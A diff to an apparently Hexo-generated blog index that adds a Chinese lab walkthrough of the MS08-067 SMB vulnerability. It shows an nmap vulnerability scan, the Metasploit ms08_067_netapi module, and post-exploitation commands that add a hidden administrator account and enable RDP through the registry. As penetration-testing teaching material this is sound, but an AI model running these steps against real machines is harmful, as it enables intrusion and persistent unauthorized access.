@@ -3,6 +3,23 @@
   
     
     <entry>
+      <title>MS08-067漏洞复现</title>
+      <link href="/2019/06/26/MS08-067%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+      <url>/2019/06/26/MS08-067%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+      
+        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中存在的逻辑错误，造成栈缓冲区可被溢出，而获得远程代码执行（Remote Code Execution）。</span><br><span class="line">                                         --摘自freebuf《MS08-067漏洞原理及详尽分析过程》</span><br></pre></td></tr></table></figure><p>这是一个十多年前的漏洞，MS08-067漏洞将会影响除Windows Server 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。SMB（server massage block）在windows操作系统中是默认在139/445端口开放的，该协议主要用来共享文件等。基于该协议的漏洞也有不少，当然，ms08067是最有名的一个。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机：kali</span><br><span class="line">靶机：window xp sp3 (English)</span><br><span class="line">win7：用于远程连接</span><br></pre></td></tr></table></figure><p>对于靶机，一开始我用的是Windows server 2003 中文版。nmap扫描发现有该漏洞，但是用msf获取shell却一直失败。后来查资料发现，Windows server 2003 中文版的payload需要稍作修改。简单起见，我换了win xp sp3，最后成功获取shell。</p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>搭好环境后，进行主机发现，靶机ip：192.168.202.137</p><p><img src="/2019/06/26/MS08-067漏洞复现/3.JPG" alt=""></p><p>nmap扫描，查看开放哪些端口,发现139、445都开放</p><p><img src="/2019/06/26/MS08-067漏洞复现/4.JPG" alt=""></p><p>继续nmap扫描，判断MS08067漏洞是否存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=smb-vuln-*.nse --script-args=unsafe=1 192.168.202.137</span><br></pre></td></tr></table></figure><p><img src="/2019/06/26/MS08-067漏洞复现/5.JPG" alt=""></p><p>发现存在ms08-067漏洞，接下来用msf进行攻击</p><h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>打开msfconsole，查找该漏洞利用框架</p><p><img src="/2019/06/26/MS08-067漏洞复现/F:/blog\Hexo\source\_posts\MS08-067漏洞复现\6.JPG" alt=""></p><p>use exploit/windows/smb/ms08_067_netapi，然后选择payload</p><p><img src="/2019/06/26/MS08-067漏洞复现/7.JPG" alt=""></p><p>show options查看参数，接下来设置参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rhost：靶机ip</span><br><span class="line">lhost：攻击机ip</span><br></pre></td></tr></table></figure><p><img src="/2019/06/26/MS08-067漏洞复现/8.JPG" alt=""></p><p>exploit</p><p><img src="/2019/06/26/MS08-067漏洞复现/9.JPG" alt=""></p><p>成功获取shell，接下来提权，步骤如下：</p><p>1、添加新用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user kangel 2314838574 /add</span><br></pre></td></tr></table></figure><p>2、添加新用户到管理员组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators kangel /add</span><br></pre></td></tr></table></figure><p>3、开放3389端口进行远程连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p><img src="/2019/06/26/MS08-067漏洞复现/10.JPG" alt=""></p><p>查看端口</p><p><img src="/2019/06/26/MS08-067漏洞复现/11.JPG" alt=""></p><p>用win7进行远程连接，首先检查能否ping通</p><p><img src="/2019/06/26/MS08-067漏洞复现/2.JPG" alt=""></p><p>进行远程连接</p><p><img src="/2019/06/26/MS08-067漏洞复现/F:/blog\Hexo\source\_posts\MS08-067漏洞复现\1.JPG" alt=""></p><p>成功！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    <entry>
       <title>jarvisOJ解题记录之pwn</title>
       <link href="/2019/05/19/jarvisOJ%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bpwn/"/>
       <url>/2019/05/19/jarvisOJ%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bpwn/</url>
@@ -250,9 +267,9 @@
       
         <tags>
             
-            <tag> web </tag>
-            
             <tag> crypto </tag>
+            
+            <tag> web </tag>
             
             <tag> MD5 </tag>
             
